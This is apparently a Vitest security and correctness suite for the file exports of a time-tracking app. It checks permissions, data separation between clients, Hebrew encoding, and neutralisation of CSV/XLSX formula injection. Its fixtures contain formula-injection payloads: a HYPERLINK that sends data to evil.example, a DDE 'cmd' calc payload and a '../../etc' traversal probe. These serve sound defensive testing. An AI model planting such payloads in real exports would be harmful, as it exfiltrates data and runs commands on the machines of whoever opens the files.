import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import ExcelJS from "exceljs";
import { NextRequest } from "next/server";
import type { User } from "@prisma/client";
import { prisma } from "./setup";
import { createTestUser, createTestClient, createTestCategory, createTestClientUser } from "./factories";
import { localDateKey, localDateTimeToUtc } from "@/lib/timezone";

// Every file Ankora hands out, opened and read.
//
// qa/e2e/exports.super.spec.ts proves the routes answer 200 with a Hebrew
// filename; it deliberately never opens the file. These tests open it,
// because what is inside is what reaches a client or an accountant:
// whose rows are in it, whether Hebrew survives, whether there is exactly
// one BOM (two shows a stray character in Excel's first cell), and
// whether a description someone typed as "=HYPERLINK(...)" becomes a live
// formula on the machine that opens the file (CWE-1236).
//
// The route handlers are called directly. Only the session is mocked:
// requireUser/requireUserOrThrow return whichever user the test set, so
// each route's own permission check runs for real.

let currentUser: User | null = null;
let cookieJar: Record<string, string> = {};

vi.mock("@/lib/app-auth/session", () => {
  class UnauthorizedError extends Error {
    constructor() {
      super("Unauthorized");
      this.name = "UnauthorizedError";
    }
  }
  return {
    UnauthorizedError,
    getCurrentUser: async () => currentUser,
    // The real one redirects to the login page; a thrown error stands in
    // for that, and no test expects a file from it.
    requireUser: async () => {
      if (!currentUser) throw new Error("NEXT_REDIRECT");
      return currentUser;
    },
    requireUserOrThrow: async () => {
      if (!currentUser) throw new UnauthorizedError();
      return currentUser;
    },
  };
});

vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (name: string) => (cookieJar[name] ? { name, value: cookieJar[name] } : undefined),
  }),
}));

const portalExport = await import("@/app/api/portal/export/route");
const reportsExport = await import("@/app/api/reports/export/route");
const timeEntriesExport = await import("@/app/api/time-entries/export/route");
const auditExport = await import("@/app/api/audit-log/export/route");
const { PORTAL_PREVIEW_COOKIE } = await import("@/lib/app-domain/client-portal");

beforeEach(() => {
  currentUser = null;
  cookieJar = {};
});
afterEach(() => {
  vi.useRealTimers();
});

const BASE = "http://localhost";
const FORMULA_TITLE = '=HYPERLINK("https://evil.example/?d="&A1,"לחץ כאן")';
const FORMULA_CATEGORY = "+SUM(A1:A2)";
const FORMULA_NOTE = "@cmd|' /c calc'!A0";
const FORMULA_NOTE_MINUS = "-2+3";

async function bytesOf(res: Response) {
  return new Uint8Array(await res.arrayBuffer());
}

/// Response.text() strips a leading BOM, which would hide exactly the
/// thing being checked. Decode by hand and keep it.
function decodeKeepingBom(bytes: Uint8Array) {
  return new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes);
}

function expectSingleBom(bytes: Uint8Array) {
  expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
  // A second BOM would be the next three bytes.
  expect([bytes[3], bytes[4], bytes[5]]).not.toEqual([0xef, 0xbb, 0xbf]);
}

/// Every CSV cell holding user text that starts with a trigger must start
/// with the neutralising apostrophe instead.
function csvCells(text: string): string[] {
  return text
    .replace(/^﻿/, "")
    .split("\r\n")
    .flatMap((line) => line.split(","));
}

async function xlsxCells(bytes: Uint8Array) {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(Buffer.from(bytes) as unknown as ArrayBuffer);
  const cells: ExcelJS.Cell[] = [];
  wb.worksheets[0].eachRow((row) => row.eachCell((cell) => cells.push(cell)));
  return cells;
}

/// The cell carrying `raw` must be plain text with the apostrophe prefix,
/// never a formula, and no cell anywhere may be a formula.
function expectNeutralisedInXlsx(cells: ExcelJS.Cell[], raw: string) {
  expect(cells.every((c) => c.type !== ExcelJS.ValueType.Formula)).toBe(true);
  const hit = cells.find((c) => typeof c.value === "string" && c.value.includes(raw));
  expect(hit, `no cell holds ${raw}`).toBeDefined();
  expect(hit!.value).toBe(`'${raw}`);
}

function expectAttachment(res: Response) {
  expect(res.headers.get("content-disposition") ?? "").toMatch(/^attachment; filename=".+"; filename\*=UTF-8''/);
}

function expectPdf(bytes: Uint8Array) {
  expect(bytes.length).toBeGreaterThan(500);
  expect(new TextDecoder().decode(bytes.slice(0, 5))).toBe("%PDF-");
}

/// Two clients with entries this Israel month. A's include a task whose
/// title is a formula payload; B's must never appear in A's files.
async function seedTwoClients() {
  const clientA = await createTestClient({ name: "לקוח אלפא" });
  const clientB = await createTestClient({ name: "לקוח בטא" });
  const catA = await createTestCategory({ clientId: clientA.id, name: "ניהול משק בית" });
  const catFormula = await createTestCategory({ clientId: clientA.id, name: FORMULA_CATEGORY });
  const catB = await createTestCategory({ clientId: clientB.id, name: "קטגוריה סודית של בטא" });
  const { user: employee } = await createTestUser({ role: "ANKORA_EMPLOYEE" });
  await prisma.user.update({ where: { id: employee.id }, data: { name: "דנה כהן" } });
  const taskA = await prisma.task.create({ data: { clientId: clientA.id, title: FORMULA_TITLE } });

  // Inside the current Israel month whatever day the suite runs: the
  // portal export's default period is "this month".
  const monthKey = localDateKey(new Date()).slice(0, 7);
  const startAt = localDateTimeToUtc(`${monthKey}-01`, "09:00");

  const mk = (clientId: string, categoryId: string, seconds: number, extra: { taskId?: string; note?: string } = {}) =>
    prisma.timeEntry.create({
      data: {
        userId: employee.id,
        clientId,
        categoryId,
        startAt,
        endAt: new Date(startAt.getTime() + seconds * 1000),
        actualSeconds: seconds,
        billableSeconds: seconds,
        ...extra,
      },
    });
  await mk(clientA.id, catA.id, 1800, { taskId: taskA.id, note: FORMULA_NOTE });
  await mk(clientA.id, catFormula.id, 900, { note: FORMULA_NOTE_MINUS });
  await mk(clientB.id, catB.id, 7200, { note: "הערה של בטא" });

  return { clientA, clientB, employee };
}

describe("GET /api/portal/export - the client's own monthly file", () => {
  it("refuses without a session, and refuses a portal user with no membership or a staff role (403, no data)", async () => {
    await seedTwoClients();
    await expect(portalExport.GET(new Request(`${BASE}/api/portal/export`))).rejects.toThrow("NEXT_REDIRECT");

    const { user: orphan } = await createTestUser({ role: "CLIENT_USER" });
    const { user: employee } = await createTestUser({ role: "ANKORA_EMPLOYEE" });
    const { user: admin } = await createTestUser({ role: "SUPER_ADMIN" });
    for (const u of [orphan, employee, admin]) {
      currentUser = u;
      const res = await portalExport.GET(new Request(`${BASE}/api/portal/export`));
      expect(res.status).toBe(403);
      expect(await res.text()).not.toContain("לקוח");
    }
  });

  it("CSV: one BOM, Hebrew intact, only client A's rows, formula payloads neutralised", async () => {
    const { clientA, employee } = await seedTwoClients();
    const { user: viewerA } = await createTestClientUser({ clientId: clientA.id, role: "VIEWER" });
    currentUser = viewerA;

    const res = await portalExport.GET(new Request(`${BASE}/api/portal/export`));
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("text/csv");
    expectAttachment(res);

    const bytes = await bytesOf(res);
    expectSingleBom(bytes);
    const text = decodeKeepingBom(bytes);
    expect(text).toContain("ניהול משק בית");
    expect(text).toContain("דנה כהן"); // portalShowEmployeeNames defaults to true
    expect(text).not.toContain("בטא");
    // Internal notes are never in the client's file, payload or not.
    expect(text).not.toContain("cmd|");
    expect(text).not.toContain(FORMULA_NOTE_MINUS);

    const cells = csvCells(text);
    expect(cells).toContain(FORMULA_CATEGORY.replace(/^/, "'"));
    expect(cells.some((c) => /^"?=/.test(c))).toBe(false);
    expect(cells.some((c) => /^"?\+/.test(c))).toBe(false);
    expect(text).toContain(`'=HYPERLINK(`);
  });

  it("hides the employee column from a client whose privacy setting says so", async () => {
    const { clientA } = await seedTwoClients();
    await prisma.client.update({ where: { id: clientA.id }, data: { portalShowEmployeeNames: false } });
    const { user: viewerA } = await createTestClientUser({ clientId: clientA.id });
    currentUser = viewerA;

    const text = decodeKeepingBom(await bytesOf(await portalExport.GET(new Request(`${BASE}/api/portal/export`))));
    expect(text).not.toContain("דנה כהן");
    expect(text.split("\r\n")[0]).not.toContain("עובד");
  });

  it("XLSX: only client A's rows, no cell is a formula", async () => {
    const { clientA } = await seedTwoClients();
    const { user: adminA } = await createTestClientUser({ clientId: clientA.id, role: "ADMIN" });
    currentUser = adminA;

    const res = await portalExport.GET(new Request(`${BASE}/api/portal/export?format=xlsx`));
    expect(res.status).toBe(200);
    expectAttachment(res);
    const cells = await xlsxCells(await bytesOf(res));
    expectNeutralisedInXlsx(cells, FORMULA_TITLE);
    expectNeutralisedInXlsx(cells, FORMULA_CATEGORY);
    const values = cells.map((c) => String(c.value));
    expect(values).toContain("ניהול משק בית");
    expect(values.join("|")).not.toContain("בטא");
  });

  it("PDF: a real PDF document", async () => {
    const { clientA } = await seedTwoClients();
    const { user: viewerA } = await createTestClientUser({ clientId: clientA.id });
    currentUser = viewerA;

    const res = await portalExport.GET(new Request(`${BASE}/api/portal/export?format=pdf`));
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("application/pdf");
    expectAttachment(res);
    expectPdf(await bytesOf(res));
  });

  it("an admin previewing client B downloads B's file and nothing of A's", async () => {
    const { clientB } = await seedTwoClients();
    const { user: admin } = await createTestUser({ role: "ANKORA_ADMIN" });
    currentUser = admin;
    cookieJar[PORTAL_PREVIEW_COOKIE] = clientB.id;

    const res = await portalExport.GET(new Request(`${BASE}/api/portal/export`));
    expect(res.status).toBe(200);
    const text = decodeKeepingBom(await bytesOf(res));
    expect(text).toContain("קטגוריה סודית של בטא");
    expect(text).not.toContain("ניהול משק בית");
  });

  // The history screen links each past monthly report to
  // ?monthOffset=-N, and the monthly screen's "previous month" button does
  // the same. The route moves the reference date with setUTCMonth on
  // TODAY's date, so on the 29th-31st the target month overflows: 31.10
  // minus one month is "31.9", which JavaScript rolls to 1.10. The client
  // asks for September and downloads October.
  // PRODUCT BUG (found 2026-10-07): app/api/portal/export/route.ts:26 (and
  // the same arithmetic in portal/monthly/page.tsx:44) - on the last days of
  // a month, "previous month" in the portal returns the current month, so a
  // client downloading last month's report receives the wrong month's hours.
  it.fails("monthOffset=-1 on 31 October exports September, not October", async () => {
    const client = await createTestClient({ name: "לקוח סוף חודש" });
    const cat = await createTestCategory({ clientId: client.id, name: "כללי" });
    const { user: employee } = await createTestUser({ role: "ANKORA_EMPLOYEE" });
    const { user: viewer } = await createTestClientUser({ clientId: client.id });
    for (const [iso, title] of [
      ["2026-09-15T09:00:00Z", "עבודה בספטמבר"],
      ["2026-10-15T09:00:00Z", "עבודה באוקטובר"],
    ] as const) {
      const task = await prisma.task.create({ data: { clientId: client.id, title } });
      const startAt = new Date(iso);
      await prisma.timeEntry.create({
        data: {
          userId: employee.id,
          clientId: client.id,
          categoryId: cat.id,
          taskId: task.id,
          startAt,
          endAt: new Date(startAt.getTime() + 3600_000),
          actualSeconds: 3600,
          billableSeconds: 3600,
        },
      });
    }
    currentUser = viewer;
    vi.useFakeTimers({ toFake: ["Date"], now: new Date("2026-10-31T10:00:00Z") });

    const res = await portalExport.GET(new Request(`${BASE}/api/portal/export?monthOffset=-1`));
    const text = decodeKeepingBom(await bytesOf(res));
    expect(text).toContain("עבודה בספטמבר");
    expect(text).not.toContain("עבודה באוקטובר");
  });
});

describe("GET /api/reports/export - internal reports", () => {
  it("401 without a session; 403 and no data for an employee or a client user", async () => {
    const { clientA } = await seedTwoClients();
    const url = `${BASE}/api/reports/export?type=hours_by_category`;
    let res = await reportsExport.GET(new NextRequest(url));
    expect(res.status).toBe(401);

    const { user: employee } = await createTestUser({ role: "ANKORA_EMPLOYEE" });
    const { user: clientUser } = await createTestClientUser({ clientId: clientA.id, role: "ADMIN" });
    for (const u of [employee, clientUser]) {
      currentUser = u;
      res = await reportsExport.GET(new NextRequest(url));
      expect(res.status).toBe(403);
      expect(await res.text()).not.toContain("ניהול");
    }
  });

  it("400 for an unknown report type", async () => {
    const { user: admin } = await createTestUser({ role: "ANKORA_ADMIN" });
    currentUser = admin;
    const res = await reportsExport.GET(new NextRequest(`${BASE}/api/reports/export?type=../../etc`));
    expect(res.status).toBe(400);
  });

  it("CSV: one BOM, Hebrew, a client filter narrows to that client, formulas neutralised", async () => {
    const { clientA } = await seedTwoClients();
    const { user: admin } = await createTestUser({ role: "ANKORA_ADMIN" });
    currentUser = admin;

    const res = await reportsExport.GET(
      new NextRequest(`${BASE}/api/reports/export?type=hours_by_category&clientId=${clientA.id}`)
    );
    expect(res.status).toBe(200);
    expectAttachment(res);
    // The Hebrew client name survives in the RFC 5987 filename.
    expect(decodeURIComponent(res.headers.get("content-disposition")!.split("UTF-8''")[1])).toContain("לקוח אלפא");

    const bytes = await bytesOf(res);
    expectSingleBom(bytes);
    const text = decodeKeepingBom(bytes);
    expect(text).toContain("ניהול משק בית");
    expect(text).not.toContain("בטא");
    expect(csvCells(text)).toContain(`'${FORMULA_CATEGORY}`);
  });

  it("XLSX: no formula cells; PDF: a real PDF", async () => {
    const { clientA } = await seedTwoClients();
    const { user: superAdmin } = await createTestUser({ role: "SUPER_ADMIN" });
    currentUser = superAdmin;
    const q = `type=hours_by_category&clientId=${clientA.id}`;

    const xlsx = await reportsExport.GET(new NextRequest(`${BASE}/api/reports/export?${q}&format=xlsx`));
    expect(xlsx.status).toBe(200);
    expectAttachment(xlsx);
    const cells = await xlsxCells(await bytesOf(xlsx));
    expectNeutralisedInXlsx(cells, FORMULA_CATEGORY);
    expect(cells.map((c) => String(c.value)).join("|")).not.toContain("בטא");

    const pdf = await reportsExport.GET(new NextRequest(`${BASE}/api/reports/export?${q}&format=pdf`));
    expect(pdf.status).toBe(200);
    expectAttachment(pdf);
    expectPdf(await bytesOf(pdf));
  });
});

describe("GET /api/time-entries/export - row-by-row entries with internal notes", () => {
  // The file carries every entry's internal note, so it is gated on
  // time_entry.edit_others like the admin screen it mirrors. An employee
  // does not export even their own entries here (they have no such
  // screen), and a client user never gets internal notes.
  it("401 without a session; 403 and no data for an employee or a client user", async () => {
    const { clientA } = await seedTwoClients();
    const url = `${BASE}/api/time-entries/export?clientId=${clientA.id}`;
    expect((await timeEntriesExport.GET(new NextRequest(url))).status).toBe(401);

    const { user: employee } = await createTestUser({ role: "ANKORA_EMPLOYEE" });
    const { user: clientUser } = await createTestClientUser({ clientId: clientA.id, role: "ADMIN" });
    for (const u of [employee, clientUser]) {
      currentUser = u;
      const res = await timeEntriesExport.GET(new NextRequest(url));
      expect(res.status).toBe(403);
      expect(await res.text()).not.toContain("הערה");
    }
  });

  it("CSV: one BOM, only the filtered client's entries, notes neutralised", async () => {
    const { clientA } = await seedTwoClients();
    const { user: admin } = await createTestUser({ role: "ANKORA_ADMIN" });
    currentUser = admin;

    const res = await timeEntriesExport.GET(new NextRequest(`${BASE}/api/time-entries/export?clientId=${clientA.id}`));
    expect(res.status).toBe(200);
    expectAttachment(res);
    const bytes = await bytesOf(res);
    expectSingleBom(bytes);
    const text = decodeKeepingBom(bytes);
    const lines = text.replace(/^﻿/, "").split("\r\n");
    expect(lines).toHaveLength(3); // header + A's two entries
    expect(text).toContain("לקוח אלפא");
    expect(text).toContain("דנה כהן");
    expect(text).not.toContain("בטא");

    const cells = csvCells(text);
    expect(cells).toContain(`'${FORMULA_NOTE}`);
    expect(cells).toContain(`'${FORMULA_NOTE_MINUS}`);
    expect(cells).toContain(`'${FORMULA_CATEGORY}`);
  });

  it("XLSX: no formula cells, B absent; PDF: a real PDF", async () => {
    const { clientA } = await seedTwoClients();
    const { user: admin } = await createTestUser({ role: "SUPER_ADMIN" });
    currentUser = admin;

    const xlsx = await timeEntriesExport.GET(
      new NextRequest(`${BASE}/api/time-entries/export?clientId=${clientA.id}&format=xlsx`)
    );
    expect(xlsx.status).toBe(200);
    expectAttachment(xlsx);
    const cells = await xlsxCells(await bytesOf(xlsx));
    expectNeutralisedInXlsx(cells, FORMULA_NOTE);
    expectNeutralisedInXlsx(cells, FORMULA_NOTE_MINUS);
    expect(cells.map((c) => String(c.value)).join("|")).not.toContain("בטא");

    const pdf = await timeEntriesExport.GET(
      new NextRequest(`${BASE}/api/time-entries/export?clientId=${clientA.id}&format=pdf`)
    );
    expect(pdf.status).toBe(200);
    expectPdf(await bytesOf(pdf));
  });
});

describe("GET /api/audit-log/export - Super Admin only", () => {
  it("401 without a session; 403 for every role but SUPER_ADMIN", async () => {
    const client = await createTestClient();
    const url = `${BASE}/api/audit-log/export`;
    expect((await auditExport.GET(new NextRequest(url))).status).toBe(401);

    for (const role of ["ANKORA_ADMIN", "ANKORA_EMPLOYEE"] as const) {
      currentUser = (await createTestUser({ role })).user;
      expect((await auditExport.GET(new NextRequest(url))).status).toBe(403);
    }
    currentUser = (await createTestClientUser({ clientId: client.id, role: "ADMIN" })).user;
    expect((await auditExport.GET(new NextRequest(url))).status).toBe(403);
  });

  it("CSV: one BOM, Hebrew actor and client names, formula payload in an action neutralised", async () => {
    const client = await createTestClient({ name: "לקוח ביומן" });
    const { user: actor } = await createTestUser({ role: "ANKORA_ADMIN" });
    await prisma.user.update({ where: { id: actor.id }, data: { name: "יוסי לוי" } });
    await prisma.auditEvent.create({
      data: { actorId: actor.id, action: "=1+1", entityType: "Client", entityId: client.id, clientId: client.id },
    });
    await prisma.auditEvent.create({ data: { action: "system.tick", entityType: "System" } });
    currentUser = (await createTestUser({ role: "SUPER_ADMIN" })).user;

    const res = await auditExport.GET(new NextRequest(`${BASE}/api/audit-log/export?entityType=Client`));
    expect(res.status).toBe(200);
    expectAttachment(res);
    const bytes = await bytesOf(res);
    expectSingleBom(bytes);
    const text = decodeKeepingBom(bytes);
    expect(text).toContain("יוסי לוי");
    expect(text).toContain("לקוח ביומן");
    // The entityType filter is applied: the System row is not in the file.
    expect(text).not.toContain("system.tick");
    expect(csvCells(text)).toContain("'=1+1");
  });
});
